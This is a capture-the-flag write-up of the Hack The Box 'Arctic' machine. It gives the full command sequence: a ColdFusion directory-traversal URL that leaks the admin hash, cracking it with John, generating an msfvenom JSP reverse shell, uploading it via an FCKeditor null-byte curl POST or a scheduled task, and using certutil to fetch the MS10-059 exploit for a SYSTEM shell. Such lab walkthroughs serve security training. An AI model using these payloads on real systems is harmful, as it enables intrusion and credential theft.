## ----------->> Arctic <<-----------

// First we start with nmap scan

    $ nmap -sV -A -Pn 10.10.10.11 -p-
-----

    Nmap scan report for 10.10.10.11
    Host is up (0.13s latency).
    Not shown: 65532 filtered ports
    PORT      STATE SERVICE VERSION
    135/tcp   open  msrpc   Microsoft Windows RPC
    8500/tcp  open  fmtp?
    49154/tcp open  msrpc   Microsoft Windows RPC
    Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

// navigate to http://10.10.10.11:8500 gets us to 2 directories

![Image 1](https://github.com/W0lfySec/HTB-Writeups/blob/main/Images/Arctic/1.png)

// After some digging, we navigate to login page of Adobe ColdFusion==> http://10.10.10.11:8500/CFIDE/administrator/

![Image 2](https://github.com/W0lfySec/HTB-Writeups/blob/main/Images/Arctic/2.png)

// searching in exploit-db we found CVE-2010-2861 Adobe ColdFusion - Directory Traversal 

![Image 3](https://github.com/W0lfySec/HTB-Writeups/blob/main/Images/Arctic/3.png)

// Also there is some exploits i found with searsploit(We will save that for later)

![Image 12](https://github.com/W0lfySec/HTB-Writeups/blob/main/Images/Arctic/12.png)

// In the description what cougth my eye:

![Image 4](https://github.com/W0lfySec/HTB-Writeups/blob/main/Images/Arctic/4.png)

    .............................................
    # Working GET request courtesy of carnal0wnage:
    # http://server/CFIDE/administrator/enter.cfm?locale=../../../../../../../../../../ColdFusion8/lib/password.properties%00en
    .....................................................

// navigating to save directory in our server

    http://10.10.10.11:8500/CFIDE/administrator/enter.cfm?locale=../../../../../../../../../../ColdFusion8/lib/password.properties%00en

// gets us output on the web page

![Image 5](https://github.com/W0lfySec/HTB-Writeups/blob/main/Images/Arctic/5.png)

    #Wed Mar 22 20:53:51 EET 2017 rdspassword=0IA/F[[E>[$_6& \\Q>[K\=XP \n password=2F635F6D20E3FDE0C53075A84B68FB07DCEC9B03 encrypted=true

    #Wed Mar 22 20:53:51 EET 2017 rdspassword=0IA/F[[E>[$_6& \\Q>[K\=XP \n password=2F635F6D20E3FDE0C53075A84B68FB07DCEC9B03 encrypted=true 


// crack the hash using john

// First save the hash to file clled 'hash'

    $ cat hash 
    2F635F6D20E3FDE0C53075A84B68FB07DCEC9B03

// run john on hash file

    $ john test1.txt 
    Warning: detected hash type "Raw-SHA1", but the string is also recognized as "Raw-SHA1-AxCrypt"
    Use the "--format=Raw-SHA1-AxCrypt" option to force loading these as that type instead
    Warning: detected hash type "Raw-SHA1", but the string is also recognized as "Raw-SHA1-Linkedin"
    Use the "--format=Raw-SHA1-Linkedin" option to force loading these as that type instead
    Warning: detected hash type "Raw-SHA1", but the string is also recognized as "ripemd-160"
    Use the "--format=ripemd-160" option to force loading these as that type instead
    Using default input encoding: UTF-8
    Loaded 1 password hash (Raw-SHA1 [SHA1 128/128 ASIMD 4x])
    Warning: no OpenMP support for this hash type, consider --fork=4
    Proceeding with single, rules:Single
    Press 'q' or Ctrl-C to abort, almost any other key for status
    Almost done: Processing the remaining buffered candidate passwords, if any.
    Proceeding with wordlist:/usr/share/john/password.lst, rules:Wordlist
    happyday         (?)
    1g 0:00:00:00 DONE 2/3 (2021-08-05 15:07) 16.66g/s 24266p/s 24266c/s 24266C/s happy123..harley1
    Use the "--show --format=Raw-SHA1" options to display all of the cracked passwords reliably
    Session completed

-----

    2F635F6D20E3FDE0C53075A84B68FB07DCEC9B03 ===>> [sha1]	happyday


// log into http://10.10.10.11:8500/CFIDE/administrator/

// redirects us to http://10.10.10.11:8500/CFIDE/administrator/index.cfm

![Image 6](https://github.com/W0lfySec/HTB-Writeups/blob/main/Images/Arctic/6.png)

// JSP stands for Java Server Pages. and seens CloudFusion is java program .jsp its the file format we can upload.

// we will do that with msfvenom

    $ msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.17.8 LPORT=1444 -f raw > exp.jsp
    Payload size: 1498 bytes


### == Upload reverse shell payload: way 1 ==

// When we was searching for exploits with searsploit i notice ColdFusion 8.0.1 - Arbitrary File Upload / Execution (Metasploit)

![Image 13](https://github.com/W0lfySec/HTB-Writeups/blob/main/Images/Arctic/13.png)

// In the description we can see the values and method for upload the file 

    $ searchsploit -x cfm/webapps/16788.rb
-----

    .......

    dbl = Rex::MIME::Message.new
    dbl.add_part(payload.encoded, "application/x-java-archive", nil, "form-data; name=\"newfile\"; filename=\"#{rand_text_alpha_upper(8)}.txt\"")
    file = dbl.to_s
    file.strip!

    print_status("Sending our POST request...")

    res = send_request_cgi(
        {
          'uri'           => "#{datastore['FCKEDITOR_DIR']}",
          'query'         => "Command=FileUpload&Type=File&CurrentFolder=/#{page}%00",
          'version'       => '1.1',
          'method'        => 'POST',
          'ctype'         => 'multipart/form-data; boundary=' + dbl.bound,
          'data'          => file,
          }, 5)

    ........
    
// Upload our payload curl POST method

    curl -X POST -F newfile=@exp.jsp 'http://10.10.10.11:8500/CFIDE/scripts/ajax/FCKeditor/editor/filemanager/connectors/cfm/upload.cfm?Command=FileUpload&Type=File&CurrentFolder=/exp.jsp%00'

// Open a listiner with nc

    $ rlwrap nc -lvnp 1444
    listening on [any] 1444 ...


### == Upload reverse shell payload: way 2 ==

// Digging the administrator dashboed we see option called Scheduled Tasks there we can upload a New Tasks in the Schedule Tasks

![Image 8](https://github.com/W0lfySec/HTB-Writeups/blob/main/Images/Arctic/8.png)

// We can check directories mapping by navigate ==> Server Settings > Mappings 

![Image 7](https://github.com/W0lfySec/HTB-Writeups/blob/main/Images/Arctic/7.png)

// Now we can fill the New Task, Click again on 'Sheduled Tasks' >> 'Shedule New Task'

    URL   ==>>  http://10.10.17.8/exp.jsp
    File  ==>>  C:\ColdFusion8\www\root\CFIDE\

    ==> Submit


// before run schedule open python http server for obtain the downloaded payload

    $ sudo python3 -m http.server 80
    Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...

// Open a listiner with nc

    $ rlwrap nc -lvnp 1444
    listening on [any] 1444 ...

// run new schedule

    $ sudo python3 -m http.server 80
    Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
    10.10.10.11 - - [07/Jul/2021 23:23:52] "GET /exp.jsp HTTP/1.1" 200 -




// Navigatin to http:10.10.10.11:8500/ , we can see a new directory called /userfiles

![Image 10](https://github.com/W0lfySec/HTB-Writeups/blob/main/Images/Arctic/10.png)

// There we could find the file we uploaded (with strange name) -> click on that file

![Image 11](https://github.com/W0lfySec/HTB-Writeups/blob/main/Images/Arctic/11.png)

// And, We got a shell !!!

    $ rlwrap nc -lvnp 1444
    listening on [any] 1444 ...
    connect to [10.10.16.238] from (UNKNOWN) [10.10.10.11] 49513
    Microsoft Windows [Version 6.1.7600]
    Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

    C:\ColdFusion8\runtime\bin> whoami
    arctic\tolis

// and user flag !!

    C:\Users\tolis\Desktop> type user.txt
    02650d3.................


### -------Privilleges Escalation------

// Lets run systemifo

    C:\Users\tolis\Desktop> systeminfo
-------

    Host Name:                 ARCTIC
    OS Name:                   Microsoft Windows Server 2008 R2 Standard 
    OS Version:                6.1.7600 N/A Build 7600
    OS Manufacturer:           Microsoft Corporation
    OS Configuration:          Standalone Server
    OS Build Type:             Multiprocessor Free
    Registered Owner:          Windows User
    Registered Organization:   
    Product ID:                55041-507-9857321-84451
    Original Install Date:     22/3/2017, 11:09:45 ��
    System Boot Time:          7/8/2021, 1:26:32 ��
    System Manufacturer:       VMware, Inc.
    System Model:              VMware Virtual Platform
    System Type:               x64-based PC
    Processor(s):              2 Processor(s) Installed.
                               [01]: AMD64 Family 23 Model 1 Stepping 2 AuthenticAMD ~2000 Mhz
                               [02]: AMD64 Family 23 Model 1 Stepping 2 AuthenticAMD ~2000 Mhz
    BIOS Version:              Phoenix Technologies LTD 6.00, 12/12/2018
    Windows Directory:         C:\Windows
    System Directory:          C:\Windows\system32
    Boot Device:               \Device\HarddiskVolume1
    System Locale:             el;Greek
    Input Locale:              en-us;English (United States)
    Time Zone:                 (UTC+02:00) Athens, Bucharest, Istanbul
    Total Physical Memory:     1.023 MB
    Available Physical Memory: 214 MB
    Virtual Memory: Max Size:  2.047 MB
    Virtual Memory: Available: 1.149 MB
    Virtual Memory: In Use:    898 MB
    Page File Location(s):     C:\pagefile.sys
    Domain:                    HTB
    Logon Server:              N/A
    Hotfix(s):                 N/A
    Network Card(s):           1 NIC(s) Installed.
                               [01]: Intel(R) PRO/1000 MT Network Connection
                                     Connection Name: Local Area Connection
                                     DHCP Enabled:    No
                                     IP address(es)
                                     [01]: 10.10.10.11


// Copy the the output to file 'systeminfo.txt' at your host.

// Second stage its to download [Windows-Exploit-Suggester.py](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)(tool compares a targets patch levels against the Microsoft vulnerability database by AonCyberLabs)

	$ ./windows-exploit-suggester.py --update
// now we can run the script
	
	$ python windows-exploit-suggester.py -i systeminfo.txt -d 2021-07-08-mssb.xls
------

    [*] initiating winsploit version 3.3...
    [*] database file detected as xls or xlsx based on extension
    [*] attempting to read from the systeminfo input file
    [+] systeminfo input file read successfully (utf-8)
    [*] querying database file for potential vulnerabilities
    [*] comparing the 0 hotfix(es) against the 197 potential bulletins(s) with a database of 137 known exploits
    [*] there are now 197 remaining vulns
    [+] [E] exploitdb PoC, [M] Metasploit module, [*] missing bulletin
    [+] windows version identified as 'Windows 2008 R2 64-bit'
    [*] 
    [M] MS13-009: Cumulative Security Update for Internet Explorer (2792100) - Critical
    [M] MS13-005: Vulnerability in Windows Kernel-Mode Driver Could Allow Elevation of Privilege (2778930) - Important
    [E] MS12-037: Cumulative Security Update for Internet Explorer (2699988) - Critical
    [*]   http://www.exploit-db.com/exploits/35273/ -- Internet Explorer 8 - Fixed Col Span ID Full ASLR, DEP & EMET 5., PoC
    [*]   http://www.exploit-db.com/exploits/34815/ -- Internet Explorer 8 - Fixed Col Span ID Full ASLR, DEP & EMET 5.0 Bypass (MS12-037), PoC
    [*] 
    [E] MS11-011: Vulnerabilities in Windows Kernel Could Allow Elevation of Privilege (2393802) - Important
    [M] MS10-073: Vulnerabilities in Windows Kernel-Mode Drivers Could Allow Elevation of Privilege (981957) - Important
    [M] MS10-061: Vulnerability in Print Spooler Service Could Allow Remote Code Execution (2347290) - Critical
    [E] MS10-059: Vulnerabilities in the Tracing Feature for Services Could Allow Elevation of Privilege (982799) - Important
    [E] MS10-047: Vulnerabilities in Windows Kernel Could Allow Elevation of Privilege (981852) - Important
    [M] MS10-002: Cumulative Security Update for Internet Explorer (978207) - Critical
    [M] MS09-072: Cumulative Security Update for Internet Explorer (976325) - Critical
    [*] done

// Lets focuse on ms10-059

    [E] MS10-059: Vulnerabilities in the Tracing Feature for Services Could Allow Elevation of Privilege (982799) - Important

// Download the [ms10-059.exe](https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS10-059/MS10-059.exe)

	C:\Users\tolis\Desktop\tmp> certutil.exe -urlcache -split -f http://10.10.17.8/MS10-059.exe
	****  Online  ****
	  000000  ...
	  0bf800
	CertUtil: -URLCache command completed successfully.

-------

	C:\Users\tolis\Desktop\tmp> dir
	 Volume in drive C has no label.
	 Volume Serial Number is F88F-4EA5

	 Directory of C:\Users\tolis\Desktop\tmp

	07/08/2021  09:55 ��    <DIR>          .
	07/08/2021  09:55 ��    <DIR>          ..
	07/08/2021  09:58 ��           784.384 ms10-059.exe
		       1 File(s)        784.384 bytes
		       2 Dir(s)  33.180.422.144 bytes free

// Run ms10-059.exe with <IP> & <PORT>

	C:\Users\tolis\Desktop\tmp> ms10-059.exe 10.10.17.8 443
	/Chimichurri/-->This exploit gives you a Local System shell <BR>/Chimichurri/-->Changing registry values...<BR>/Chimichurri/-->Got SYSTEM token...<BR>/Chimichurri/-->Running reverse shell...<BR>/Chimichurri/-->Restoring default registry values...<BR>

// We got NT/SYSTEM !!!
	
	$ sudo rlwrap nc -lvnp 443
	listening on [any] 443 ...
	connect to [10.10.17.8] from (UNKNOWN) [10.10.10.11] 51258
	Microsoft Windows [Version 6.1.7600]
	Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

	C:\Users\tolis\Desktop\tmp>whoami
	whoami
	nt authority\system

// We got root flag !

	C:\Users\Administrator\Desktop> type root.txt
	ce65ceee6............................
